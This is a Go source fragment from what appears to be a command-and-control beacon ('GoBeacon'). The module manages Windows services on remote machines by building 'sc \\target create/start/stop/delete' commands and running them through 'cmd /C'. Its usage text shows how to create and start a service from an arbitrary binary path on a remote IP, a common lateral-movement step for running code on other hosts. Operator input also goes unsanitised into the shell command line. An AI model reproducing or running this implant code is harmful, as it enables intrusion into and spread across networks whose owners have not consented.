// Remote Service Management module - Manage remote Windows services

func (b *GoBeacon) moduleRemoteServiceManagement(parameters string) string {
	var result strings.Builder
	result.WriteString("=== REMOTE SERVICE MANAGEMENT ===\n")

	parts := strings.Split(parameters, ",")
	if len(parts) < 2 {
		result.WriteString("Remote service management requires: target,action[,service_name][,binary_path]\n")
		result.WriteString("Actions: list, create, start, stop, delete\n")
		result.WriteString("Examples:\n")
		result.WriteString("  192.168.1.1,list\n")
		result.WriteString("  192.168.1.1,create,TestSvc,C:\\\\temp\\\\service.exe\n")
		result.WriteString("  192.168.1.1,start,TestSvc\n")
		return result.String()
	}

	target := strings.TrimSpace(parts[0])
	action := strings.TrimSpace(parts[1])

	result.WriteString(fmt.Sprintf("Target: %s\n", target))
	result.WriteString(fmt.Sprintf("Action: %s\n", action))

	switch action {
	case "list":
		result.WriteString("\n--- Listing Remote Services ---\n")
		listCmd := b.buildServiceCommand(target, "list", "", "")
		if listCmd != "" {
			cmd := exec.Command("cmd", "/C", listCmd)
			if output, err := cmd.Output(); err == nil {
				result.WriteString(string(output))
			} else {
				result.WriteString(fmt.Sprintf("Service listing failed: %v\n", err))
			}
		}

	case "create":
		if len(parts) < 4 {
			result.WriteString("Create requires: target,create,service_name,binary_path\n")
			return result.String()
		}
		serviceName := strings.TrimSpace(parts[2])
		binaryPath := strings.TrimSpace(parts[3])

		result.WriteString(fmt.Sprintf("\n--- Creating Service: %s ---\n", serviceName))
		createCmd := b.buildServiceCommand(target, "create", serviceName, binaryPath)
		if createCmd != "" {
			cmd := exec.Command("cmd", "/C", createCmd)
			if output, err := cmd.Output(); err == nil {
				result.WriteString("Service created successfully\n")
				result.WriteString(string(output))
			} else {
				result.WriteString(fmt.Sprintf("Service creation failed: %v\n", err))
			}
		}

	case "start", "stop", "delete":
		if len(parts) < 3 {
			result.WriteString(fmt.Sprintf("%s requires: target,%s,service_name\n", action, action))
			return result.String()
		}
		serviceName := strings.TrimSpace(parts[2])

		result.WriteString(fmt.Sprintf("\n--- %s Service: %s ---\n", strings.ToUpper(action[:1])+action[1:], serviceName))
		serviceCmd := b.buildServiceCommand(target, action, serviceName, "")
		if serviceCmd != "" {
			cmd := exec.Command("cmd", "/C", serviceCmd)
			if output, err := cmd.Output(); err == nil {
				result.WriteString(fmt.Sprintf("Service %s operation completed\n", action))
				result.WriteString(string(output))
			} else {
				result.WriteString(fmt.Sprintf("Service %s failed: %v\n", action, err))
			}
		}

	default:
		result.WriteString(fmt.Sprintf("Unknown action: %s\n", action))
	}

	return result.String()
}

func (b *GoBeacon) buildServiceCommand(target, action, serviceName, binaryPath string) string {
	if runtime.GOOS != "windows" {
		return "" // Service management is primarily Windows-specific
	}

	switch action {
	case "list":
		return fmt.Sprintf("sc \\\\%s query", target)
	case "create":
		return fmt.Sprintf("sc \\\\%s create %s binPath= \"%s\"", target, serviceName, binaryPath)
	case "start":
		return fmt.Sprintf("sc \\\\%s start %s", target, serviceName)
	case "stop":
		return fmt.Sprintf("sc \\\\%s stop %s", target, serviceName)
	case "delete":
		return fmt.Sprintf("sc \\\\%s delete %s", target, serviceName)
	}
	return ""
}
